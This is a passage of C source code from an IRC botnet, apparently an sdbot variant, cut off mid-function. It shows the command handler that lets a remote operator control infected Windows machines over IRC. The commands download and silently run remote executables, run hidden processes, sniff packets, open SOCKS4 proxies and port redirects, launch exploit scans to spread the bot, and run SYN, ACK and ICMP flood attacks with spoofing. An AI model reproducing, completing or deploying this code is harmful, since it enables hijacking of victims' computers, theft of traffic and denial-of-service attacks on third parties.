			else if (strcmp("die", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				if (strcmp("332", a[1]) != 0) exit(0);
			}
			else if (strcmp("logout", a[s]) == 0 || strcmp("lo", a[s]) == 0) {
				for (i = 0; i < maxlogins; i++) if (strcmp(masters[i], a[0]) == 0) {
					masters[i][0] = '\0';
					sprintf(sendbuf, "user %s logged out.\r\n", user);
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				}
			}
			else if (strcmp("reconnect", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				irc_send(sock, "QUIT :reconnecting");
				return 0;
			}
			else if (strcmp("disconnect", a[s]) == 0 || strcmp("d", a[s]) == 0) {
				irc_send(sock, "QUIT :later");
				return -1;
			}
			else if (strcmp("quit", a[s]) == 0 || strcmp("q", a[s]) == 0) {
				if (a[s+1] == NULL) irc_send(sock, "QUIT :later\r\n"); else {
					if (x != NULL) {
						char *y = strstr(x, a[s+1]);
						if (y != NULL) irc_sendf(sock, "QUIT :%s\r\n", y);
					}
				}
				return -2;
			}
			else if (strcmp("status", a[s]) == 0 || strcmp("s", a[s]) == 0) {
				DWORD total, days, hours, minutes;
				total = (GetTickCount() / 1000) - started;
				days = total / 86400;
				hours = (total % 86400) / 3600;
				minutes = ((total % 86400) % 3600) / 60;
				sprintf(sendbuf, vername" ready. Up %dd %dh %dm.", days, hours, minutes);
				irc_privmsg(sock, a[2], sendbuf, notice);
			}
			else if (strcmp("id", a[s]) == 0 || strcmp("i", a[s]) == 0) irc_privmsg(sock, a[2], (char *)botid, notice);
			else if (strcmp("about", a[s]) == 0 || strcmp("ab", a[s]) == 0) irc_privmsg(sock, a[2], vername" by [sd] (sdbot@mail.ru). homepage: http://sdbot.n3.net/", notice);
			else if (strcmp("threads", a[s]) == 0 || strcmp("t", a[s]) == 0) {
				TLIST tlist;
				_snprintf(tlist.chan, sizeof(tlist.chan), a[2]);
				tlist.sock = sock;
				tlist.notice = notice;
				tlist.silent = silent;
				tlist.full = ((a[s+1])?((strcmp(a[s+1],"sub") == 0)?(TRUE):(FALSE)):(FALSE));

				sprintf(sendbuf, "[THREADS]: List threads.");
				tlist.threadnum = addthread(sendbuf, LIST_THREAD, NULL);
				if (threads[tlist.threadnum].tHandle = CreateThread(NULL, 0, &ListThread, (LPVOID)&tlist, 0, &id)) {
					while (tlist.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"[THREADS]: Failed to start list thread, error: <%d>.", GetLastError());
				addlog(sendbuf);
	
				return repeat;
			}
			else if (strcmp("aliases", a[s]) == 0 || strcmp("al", a[s]) == 0) {
				irc_privmsg(sock, a[2], "-[alias list]-", notice);
				for (i = 0; i < maxaliases; i++) {
					if (aliases[i].name[0] != '\0') {
						sprintf(sendbuf, "%d. %s = %s", i, aliases[i].name, aliases[i].command);
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
			}
			else if (strcmp("log", a[s]) == 0 || strcmp("lg", a[s]) == 0) {
				for (i = 0; i < 128; i++) {
					if (log[i][0] != '\0') {
						irc_privmsg(sock, a[2], log[i], notice);
					}
				}
			}
			#ifndef NO_NETINFO
			else if (strcmp("netinfo", a[s]) == 0 || strcmp("ni", a[s]) == 0) irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
			#endif
			#ifndef NO_SYSINFO
			else if (strcmp("sysinfo", a[s]) == 0 || strcmp("si", a[s]) == 0) irc_privmsg(sock, a[2], sysinfo(sendbuf), notice);
			#endif
			else if (strcmp("driveinfo", a[s]) == 0 || strcmp("drv", a[s]) == 0) {
				DriveInfo(sock, a[2], notice, a[s+1]);

				return 1;
			}
			else if (strcmp(sremove, a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "removing bot...", notice);
				uninstall();
				WSACleanup();
				exit(0);
			}
			#ifndef NO_ADVSCAN
			else if (strcmp("scanstop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"[SCAN]","Scan",SCAN_THREAD,a[s+1]);

				return 1;
			}
			#endif
			#ifndef NO_PROCESS
			else if (strcmp("procs", a[s]) == 0 || strcmp("ps", a[s]) == 0) {
				if (findthreadid(PROC_THREAD) > 0) {
					if (!silent) irc_privmsg(sock, a[2], "[PROC]: Already running.", notice);
				} else {
					LPROC lproc;
					_snprintf(lproc.chan, sizeof(lproc.chan), a[2]);
					lproc.sock = sock;
					lproc.notice = notice;
					lproc.silent = silent;
					lproc.full = FALSE;
					if (a[s+1])
						if (strcmp("full", a[s+1]) == 0)
							lproc.full = TRUE;

					sprintf(sendbuf,"[PROCS]: Proccess list.");
					lproc.threadnum = addthread(sendbuf, PROC_THREAD, NULL);
					if (threads[lproc.threadnum].tHandle = CreateThread(NULL, 0, &listProcessesThread, (LPVOID)&lproc, 0, &id)) {
						while (lproc.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"[PROCS]: Failed to start listing thread, error: <%d>.", GetLastError());
					addlog(sendbuf);
				}

				return 1;
			}
			#endif
			#ifndef NO_SOCK4SERV
			else if (strcmp("socks4", a[s]) == 0 || strcmp("s4", a[s]) == 0) {
				SOCKS4 socks4;
				socks4.port = ((a[s+1])?((atoi(a[s+1])==0)?(socks4port):(atoi(a[s+1]))):(socks4port));
				((a[s+2])?(_snprintf(socks4.userid,sizeof(socks4.userid),a[s+2])):
					((parameters['a'])?(_snprintf(socks4.userid,sizeof(socks4.userid),user)):(socks4.userid[0]='\0')));
				socks4.sock = sock;
				socks4.notice = notice;
				socks4.silent = silent;
				_snprintf(socks4.chan,sizeof(socks4.chan),a[2]);

				sprintf(sendbuf, "[SOCKS4]: Server started on: %s:%d.", GetIP(sock), socks4.port);
				socks4.threadnum=addthread(sendbuf,SOCKS4_THREAD,NULL);
				if (threads[socks4.threadnum].tHandle = CreateThread(NULL, 0, &Socks4Thread, (LPVOID)&socks4, 0, &id)) {
					while(socks4.gotinfo == FALSE)
						Sleep(50);
				} else
					//addlogv("[SOCKS4]: Failed to start server thread, error: <%d>.", GetLastError());

				return 1;
			}
			else if (strcmp("socks4stop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"[SOCKS4]","Server",SOCKS4_THREAD,a[s+1]);

				return 1;
			}
			#endif
			else if (strcmp("clonestop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"[CLONE]","Clone",CLONE_THREAD,a[s+1]);

				return 1;
			}
			else if (strcmp("scanstats",a[s]) == 0 || strcmp("stats",a[s]) == 0) {
				ListExploitStats(sock,a[2],notice);

				return repeat;
			}
			#ifndef NO_FTPD
			else if (strcmp("ftpd",a[s]) == 0) {
				//
				static FTP ftp;

				srand(time(NULL));
				ftp.port = rand()%64535+1000;

				ftp.threads = 0;
				GetModuleFileName(0,ftp.filename,sizeof(ftp.filename));
				strncpy(ftp.requestname, filename, sizeof(ftp.requestname)-1);
				ftp.sock=sock;
				ftp.notice = notice;
				strncpy(ftp.chan, a[2], sizeof(ftp.chan)-1);
				ftp.silent = silent;
				
				sprintf(sendbuf, "[FTP]: Server started on Port: %d, File: %s, Request: %s.", ftp.port, ftp.filename, ftp.requestname);
				ftp.threadnum = addthread(sendbuf,FTP_THREAD,NULL);
				if (threads[ftp.threadnum].tHandle = CreateThread(NULL, 0, &ftpd, (LPVOID)&ftp, 0, &id)) {
					while (ftp.gotinfo == FALSE) 
						Sleep(50);
				} else
					sprintf(sendbuf, "[FTP]: Failed to start server, error: <%d>.", GetLastError());

				addlog(sendbuf);
				//
			}
				#endif
			// commands requiring at least 1 parameter
			#ifndef NO_PSNIFF
			else if (strcmp("sniffer", a[s]) == 0) {
				if (strcmp("on", a[s+1]) == 0) {
					if (findthreadid(PSNIFF_THREAD) > 0)
						sprintf(sendbuf ,"[SNIFFER]: Already running.");
					else {
						PSNIFF sniff;
						sniff.sock = sock;
						sniff.notice = notice;
						sniff.silent = silent;
						_snprintf(sniff.chan, sizeof(sniff.chan), ((a[s+2])?(a[s+2]):((strcmp(psniffchan,"")==0)?(a[2]):(psniffchan))));

						sprintf(sendbuf, "[Sniffer]: Carnivore packet sniffer active.");
						sniff.threadnum = addthread(sendbuf, PSNIFF_THREAD, NULL);
						if (threads[sniff.threadnum].tHandle = CreateThread(NULL, 0, &SniffThread, (LPVOID)&sniff, 0, &id)) {
							while(sniff.gotinfo == FALSE)
								Sleep(50);
						} else
							sprintf(sendbuf,"[PSNIFF]: Failed to start sniffer thread, error: <%d>.", GetLastError());
					}
				}
				else if (strcmp("off", a[s+1]) == 0) {
					if ((i=killthreadid(PSNIFF_THREAD)) > 0)
						sprintf(sendbuf,"[PSNIFF]: Carnivore stopped. (%d thread(s) stopped.)",i);
					else
						sprintf(sendbuf,"[PSNIFF]: No Carnivore thread found.");
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			#ifndef NO_PROCESS
			else if (strcmp("killproc",a[s]) == 0 || strcmp("kp", a[s]) == 0) {  // kill process name
				if(listProcesses(sock,NULL,notice,a[s+1]) == 1)
					sprintf(sendbuf,"[PROC]: Process killed: %s",a[s+1]);
				else
					sprintf(sendbuf,"[PROC]: Failed to terminate process: %s", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("kill",a[s]) == 0 || strcmp("ki", a[s]) == 0) {  // kill process id
				if(killProcess(atoi(a[s+1])) == 1)
					sprintf(sendbuf,"[PROC]: Process killed ID: %s",a[s+1]);
				else
					sprintf(sendbuf,"[PROC]: Failed to terminate process ID: %s", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif		
			
			else if (a[s+1] == NULL) return 1;
			else if (strcmp("nick", a[s]) == 0 || strcmp("n", a[s]) == 0) {
				irc_sendf(sock, "NICK %s\r\n", a[s+1]);
			}
			else if (strcmp("join", a[s]) == 0 || strcmp("j", a[s]) == 0) {
				irc_sendf2(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
			}
			else if (strcmp("part", a[s]) == 0 || strcmp("pt", a[s]) == 0) {
				irc_sendf(sock, "PART %s\r\n", a[s+1]);
			}
			else if (strcmp("raw", a[s]) == 0 || strcmp("r", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_send(sock, y);
				}
			}
			else if (strcmp("killthread", a[s]) == 0 || strcmp("k", a[s]) == 0) {
				if (strcmp("all", a[s+1]) == 0) {
					if ((i=killthreadall()) > 0)
						sprintf(sendbuf,"[THREADS]: Stopped: %d thread(s).", i);
					else
						sprintf(sendbuf,"[THREADS]: No active threads found.");
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);					
				} else {
					for (i = s+1; i < (sizeof(a)/4); i++) {
						if (a[i]==NULL) break;
					
						if (killthread(atoi(a[i])))
							sprintf(sendbuf,"[THREADS]: Killed thread: %s.",a[i]);
						else 
							sprintf(sendbuf,"[THREADS]: Failed to kill thread: %s.",a[i]);
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
				}

				return 1;
			}
			else if (strcmp("c_quit", a[s]) == 0 || strcmp("c_q", a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
					irc_send(csock[atoi(a[s+1])], "QUIT :later");
					Sleep(500);
					closesocket(csock[atoi(a[s+1])]);
					TerminateThread(threads[atoi(a[s+1])].tHandle, id);
					threads[atoi(a[s+1])].tHandle = 0;
					threads[atoi(a[s+1])].name[0] = '\0';
				}
			}
			else if (strcmp("c_rndnick", a[s]) == 0 || strcmp("c_rn", a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
					sprintf(sendbuf, "NICK %s", rndnick(sock,ntmp,nickprefix,nicktype));
					irc_send(csock[atoi(a[s+1])], sendbuf);
				}
			}
			else if (strcmp("prefix", a[s]) == 0 || strcmp("pr", a[s]) == 0) prefix1 = a[s+1][0];
			else if (strcmp("open", a[s]) == 0 || strcmp("o", a[s]) == 0) {
				if (ShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW)) {
					if (!silent) irc_privmsg(sock, a[2], "file opened.", notice);
				} else {
					if (!silent) irc_privmsg(sock, a[2], "couldn't open file.", notice);
				}
			}
			else if (strcmp("server", a[s]) == 0 || strcmp("se", a[s]) == 0) {
				strncpy(server,  a[s+1], 127);
			}
			else if (strcmp("dns", a[s]) == 0 || strcmp("dn", a[s]) == 0) {
				HOSTENT *hostent = NULL;
				IN_ADDR iaddr;
				DWORD addr = inet_addr(a[s+1]);

				if (addr != INADDR_NONE) {
					hostent = gethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
					if (hostent != NULL) {
						sprintf(sendbuf, "%s -> %s", a[s+1], hostent->h_name);
					  	irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
				else {
					hostent = gethostbyname(a[s+1]);
					if (hostent != NULL) {
						iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
						sprintf(sendbuf, "%s -> %s", a[s+1], inet_ntoa(iaddr));
						irc_privmsg(sock, a[2], sendbuf, notice);
					}
				}
				if (hostent == NULL) irc_privmsg(sock, a[2], "couldn't resolve host", notice);
			}
			#ifndef NO_VISIT
			else if (strcmp("visit", a[s]) == 0 || strcmp("v", a[s]) == 0) {
				vs vs;
				strncpy(vs.host,  a[s+1], sizeof(vs.host)-1);
				if (a[s+2] != NULL) strncpy(vs.referer, a[s+2], sizeof(vs.referer)-1);
				strncpy(vs.chan, a[2], sizeof(vs.chan)-1);
				vs.sock = sock;
				vs.silent = silent;
				CreateThread(NULL, 0, &visit, (void *)&vs, 0, &id);
				while(1) {
					if (vs.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			else if (strcmp("mirccmd", a[s]) == 0 || strcmp("mirc", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]); 
					if (y != NULL) {
						if (!mirccmd(y))
							sprintf(sendbuf,"[mIRC]: Client not open.");
						else
							sprintf(sendbuf,"[mIRC]: Command sent.");
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
                }

				return repeat;
			}
			// commands requiring at least 2 parameters
			else if (a[s+2] == NULL) return 1;
			else if (strcmp("addalias", a[s]) == 0 || strcmp("aa", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) addalias(a[s+1], y);
				}
			}
			else if (strcmp("privmsg", a[s]) == 0 || strcmp("pm", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) irc_privmsg(sock, a[s+1], y, FALSE);
				}
			}
			else if (strcmp("action", a[s]) == 0 || strcmp("a", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						sprintf(sendbuf, "\1ACTION %s\1", y);
						irc_privmsg(sock, a[s+1], sendbuf, FALSE);
					}
				}
			}
			else if (strcmp("cycle", a[s]) == 0 || strcmp("cy", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				irc_sendf(sock, "PART %s\r\n", a[s+2]);
				Sleep(atoi(a[s+1])*1000);
				irc_sendf2(sock, "JOIN %s %s\r\n", a[s+2], a[s+3]);
			}
			else if (strcmp("mode", a[s]) == 0 || strcmp("m", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) irc_sendf(sock, "MODE %s\r\n", y);
				}
			}
			else if (strcmp("repeat", a[s]) == 0 || strcmp("rp", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) return repeat + atoi(a[s+1]); else return repeat;
				}
			}
			else if (strcmp("c_raw", a[s]) == 0 || strcmp("c_r", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], y);
				}
			}
			else if (strcmp("c_mode", a[s]) == 0 || strcmp("c_m", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) sprintf(sendbuf, "MODE %s", y);
					if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
				}
			}
			else if (strcmp("c_nick", a[s]) == 0 || strcmp("c_n", a[s]) == 0) {
				sprintf(sendbuf, "NICK %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp("c_join", a[s]) == 0 || strcmp("c_j", a[s]) == 0) {
				sprintf(sendbuf, "JOIN %s %s", a[s+2], a[s+3]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp("c_part", a[s]) == 0 || strcmp("c_p", a[s]) == 0) {
				sprintf(sendbuf, "PART %s", a[s+2]);
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) irc_send(csock[atoi(a[s+1])], sendbuf);
			}
			else if (strcmp("repeat", a[s]) == 0 || strcmp("rp", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) return repeat + atoi(a[s+1]); else return repeat;
				}
			}
			else if (strcmp("delay", a[s]) == 0 || strcmp("de", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0) return 1;
				if (x != NULL) {
					char *r = strstr(x, a[s+2]);
					sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], r);
					strncpy(line,  sendbuf, 511);
					if (atoi(a[s+1]) > 0) Sleep(atoi(a[s+1])*1000);
					return repeat + 1;
				}
			}
			#ifndef NO_DOWNLOAD
			else if (strcmp(supdate, a[s]) == 0) {
				if (strcmp(botid, a[s+2]) == 0) return 1;
				ds ds;
				char *filename[MAX_PATH];
				memset(filename,0,sizeof(filename));
				sprintf(ds.dest, "%s\\%s.exe", tempdir, rndnickletter((char*)filename));
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				sprintf(sendbuf, "update (%s)", ds.url);
				ds.threadnum = addthread(sendbuf, UPDATE_THREAD, sock);
				ds.update = 1;
				ds.silent = silent;
				threads[ds.threadnum].tHandle = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				sprintf(sendbuf, "downloading update from %s...\r\n", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				while(1) {
					if (ds.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			#ifndef NO_ICMP
			else if (strcmp("icmpflood", a[s]) == 0 || strcmp("icmp", a[s]) == 0) {
				ICMPFLOOD icmpflood;
				if ((icmpflood.time = atoi(a[s+2])) > 0) {
					_snprintf(icmpflood.ip,sizeof(icmpflood.ip),a[s+1]);
					icmpflood.spoof = ((parameters['r'])?(TRUE):(FALSE));
					icmpflood.sock = sock;
					_snprintf(icmpflood.chan,sizeof(icmpflood.chan),a[2]);
					icmpflood.notice = notice;
					icmpflood.silent = silent;

					_snprintf(sendbuf,sizeof(sendbuf),"[ICMP]: Flooding: (%s) for %s seconds.", a[s+1], a[s+2]);
					icmpflood.threadnum = addthread(sendbuf,ICMP_THREAD,NULL);
					if (threads[icmpflood.threadnum].tHandle = CreateThread(NULL, 0, &ICMPFloodThread, (LPVOID)&icmpflood, 0, &id)) {
						while(icmpflood.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"[ICMP]: Failed to start flood thread, error: <%d>.", GetLastError());
				} else
					sprintf(sendbuf,"[ICMP]: Invalid flood time must be greater than 0.");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			
			else if (strcmp("execute", a[s]) == 0 || strcmp("e", a[s]) == 0) {
				PROCESS_INFORMATION pinfo;
				STARTUPINFO sinfo;
				memset(&sinfo, 0, sizeof(STARTUPINFO));
				sinfo.cb = sizeof(sinfo);
				if (atoi(a[s+1]) == 0) sinfo.wShowWindow = SW_HIDE; else sinfo.wShowWindow = SW_SHOW;
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) if (!CreateProcess(NULL, y, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo) && !silent) irc_privmsg(sock, a[2], "couldn't execute file.", notice);
				}
			}
			// commands requiring at least 3 parameters
			else if (a[s+3] == NULL) return 1;
			
			else if (strcmp("clone", a[s]) == 0 || strcmp("c", a[s]) == 0) {
				ircs irc;
				strncpy(irc.host,  a[s+1], sizeof(irc.host)-1);
				irc.port = atoi(a[s+2]);
				strncpy(irc.channel,  a[s+3], sizeof(irc.channel)-1);
				if (a[s+4] != NULL) strncpy(irc.chanpass,  a[s+4], sizeof(irc.chanpass)-1);
				sprintf(sendbuf, "clone (%s)", irc.host);
				irc.threadnum = addthread(sendbuf, CLONE_THREAD, NULL);
				if (!silent) {
					sprintf(sendbuf, "clone created on %s:%d, in channel %s.\r\n", irc.host, irc.port, irc.channel);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
				threads[irc.threadnum].tHandle = CreateThread(NULL, 0, &irc_connect, (void *)&irc, 0, &id);
				while(1) {
					if (irc.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#ifndef NO_DOWNLOAD
			else if (strcmp(sdownload, a[s]) == 0) {
				ds ds;
				strncpy(ds.url,  a[s+1], sizeof(ds.url)-1);
				strncpy(ds.dest,  a[s+2], sizeof(ds.dest)-1);
				if (a[s+3] != NULL) ds.run = atoi(a[s+3]); else ds.run = 0;
				ds.sock = sock;
				strncpy(ds.chan,  a[2], sizeof(ds.chan)-1);
				sprintf(sendbuf, "download (%s)", ds.url);
				ds.threadnum = addthread(sendbuf, DOWNLOAD_THREAD, sock);
				ds.update = 0;
				ds.silent = silent;
				threads[ds.threadnum].tHandle = CreateThread(NULL, 0, &webdownload, (void *)&ds, 0, &id);
				if (!silent) sprintf(sendbuf, "downloading %s...\r\n", a[s+1]);
				irc_privmsg(sock, a[2], sendbuf, notice);
				while(1) {
					if (ds.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			
			

			#ifndef NO_REDIRECT
			else if (strcmp("redirect", a[s]) == 0 || strcmp("rd", a[s]) == 0) {
				rs rs;
				rs.lport = atoi(a[s+1]);
				strncpy(rs.dest,  a[s+2], sizeof(rs.dest)-1);
				rs.port = atoi(a[s+3]);
				rs.sock = sock;
				sprintf(sendbuf, "redirect (%d->%s:%d)", rs.lport, rs.dest, rs.port);
				rs.threadnum = addthread(sendbuf,REDIRECT_THREAD,NULL);
				if (!silent) sprintf(sendbuf, "redirect created on port %d to %s:%d.\r\n", rs.lport, rs.dest, rs.port);
				irc_privmsg(sock, a[2], sendbuf, notice);
				threads[rs.threadnum].tHandle = CreateThread(NULL, 0, &redirect, (void *)&rs, 0, &id);
				while(1) {
					if (rs.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
			else if (strcmp("c_privmsg", a[s]) == 0 || strcmp("c_pm", a[s]) == 0) {
				if (cnick[atoi(a[s+1])][0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
						irc_privmsg(csock[atoi(a[s+1])], a[s+2], y, FALSE);
						//if (threadd[atoi(a[s+1])][0] == 's') {
						//	sprintf(sendbuf, "[%s] <%s> %s", a[s+2], cnick[atoi(a[s+1])], y);
						//	irc_privmsg(sock, a[2], sendbuf, notice);
						//}
					}
				}
			}
			else if (strcmp("c_action", a[s]) == 0 || strcmp("c_a", a[s]) == 0) {
				if (cnick[atoi(a[s+1])][0] != '\0' && x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + strlen(a[s+2]) + 2;
					char *y = strstr(x, a[s+3]);
					sprintf(sendbuf, "\1ACTION %s\1", y);
					if (y != NULL && atoi(a[s+1]) > 0 && atoi(a[s+1]) < 65) {
						irc_privmsg(csock[atoi(a[s+1])], a[s+2], sendbuf, FALSE);
						//if (threadd[atoi(a[s+1])][0] == 's') {
						//	sprintf(sendbuf, "[%s] * %s %s", a[s+2], cnick[atoi(a[s+1])], y);
						//	irc_privmsg(sock, a[2], sendbuf, notice);
						//}
					}
				}
			}
			// commands requiring at least 4 parameters
			else if (a[s+4] == NULL) return 1;
			#ifndef NO_ADVSCAN
			else if (strcmp(sadvscan, a[s]) == 0) {
				int scanthreads=findthreadid(SCAN_THREAD);
				if (scanthreads + atoi(a[s+2]) > MAXSCANTHRD) {
					sprintf(sendbuf ,"[SCAN]: Already %d scanning threads. Too many specified.", scanthreads);
					irc_privmsg(sock,a[2],sendbuf,notice);
				} else {
					ADVSCAN advscan;
					advscan.port = atoi(a[s+1]); // check for method or port number
					advscan.threads = atoi(a[s+2]);
					advscan.delay = atoi(a[s+3]);
					advscan.delay = ((advscan.delay < 5)?(5):(advscan.delay));
					advscan.delay = ((advscan.delay > 60)?(60):(advscan.delay));
					advscan.minutes = atoi(a[s+4]);
					advscan.minutes = ((advscan.minutes > MAXSCANTIME)?(MAXSCANTIME):(advscan.minutes));
					advscan.exploit = -1;

					for(i=0;exploit[i].port != 0;i++) {
						if (strcmp(exploit[i].command, a[s+1]) == 0) {
							advscan.port = exploit[i].port;
							advscan.exploit = i;

							break;
						}
					}

					if (advscan.port == 0) {
						sprintf(sendbuf, "[SCAN]: Failed to start scan, port is invalid.");
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);

						return 1;
					}

					if (a[s+5] && a[s+5][0] != '#') {
						_snprintf(advscan.ip,sizeof(advscan.ip),a[s+5]);
						advscan.random = ((strchr(a[s+5],'x'))?(TRUE):(FALSE));
					} else {
						if (parameters['a'] || parameters['b'] || parameters['r']) {
							SOCKADDR_IN ssin;
							int ssin_len=sizeof(ssin);
							getsockname(sock,(LPSOCKADDR)&ssin,&ssin_len);
							ssin.sin_addr.S_un.S_addr&=(parameters['a']) ? 0xFF : 0xFFFF;
							strncpy(advscan.ip,inet_ntoa(ssin.sin_addr), sizeof(advscan.ip));

							if (parameters['r']) {
								int extractip = ((parameters['a']) ? 3 : 2);
								for (char *c=strrchr(advscan.ip,'0'),i=0;i<extractip && c;c[0]='x',c=strrchr(advscan.ip,'0'),i++);
							
								advscan.random = TRUE;
							} else
								advscan.random = FALSE;
						} else {
							sprintf(sendbuf, "[SCAN]: Failed to start scan, no IP specified.");
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							addlog(sendbuf);
							
							return 1;
						}
					}

					advscan.sock = sock;
					advscan.notice = notice;
					advscan.silent = silent;
					_snprintf(advscan.chan,sizeof(advscan.chan),a[2]);
					if (a[s+6])
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+6]);
					else if (a[s+5] && a[s+5][0] == '#')
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),a[s+5]);
					else if (strcmp(exploitchan,"") != 0)
						_snprintf(advscan.msgchan,sizeof(advscan.msgchan),exploitchan);
					else
						advscan.msgchan[0] = '\0';

					sprintf(sendbuf, "[SCAN]: %s Port Scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.", 
						((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
					advscan.threadnum = addthread(sendbuf,SCAN_THREAD,NULL);
					if (threads[advscan.threadnum].tHandle = CreateThread(NULL, 0, &AdvScanner, (LPVOID)&advscan, 0, &id)) {
						while(advscan.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"[SCAN]: Failed to start scan thread, error: <%d>.", GetLastError());

					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);

					return 1;
				}
			}
			#endif
			#ifndef NO_DDOS
			else if (strcmp("ddos.syn", a[s]) == 0 || strcmp("ddos.ack", a[s]) == 0 || strcmp("ddos.random", a[s]) == 0) {
				DDOS ddos;
				strncpy(ddos.ip, a[s+1], sizeof(ddos.ip)-1);
				strncpy(ddos.port, a[s+2], sizeof(ddos.port)-1);
				strncpy(ddos.length, a[s+3], sizeof(ddos.length)-1);
				strncpy(ddos.chan, a[2], sizeof(ddos.chan)-1);
				strncpy(ddos.type,a[s],32);
				ddos.notice = notice;
				ddos.silent = silent;
				ddos.sock = sock;

				sprintf(sendbuf, "[DDoS]: Flooding: (%s:%s) for %s seconds.", a[s+1], a[s+2], a[s+3]);
				ddos.threadnum = addthread(sendbuf,DDOS_THREAD,NULL);
				if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &DDOSThread, (LPVOID)&ddos, 0, &id)) {
					while(ddos.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"[DDoS]: Failed to start flood thread, error: <%d>.", GetLastError());

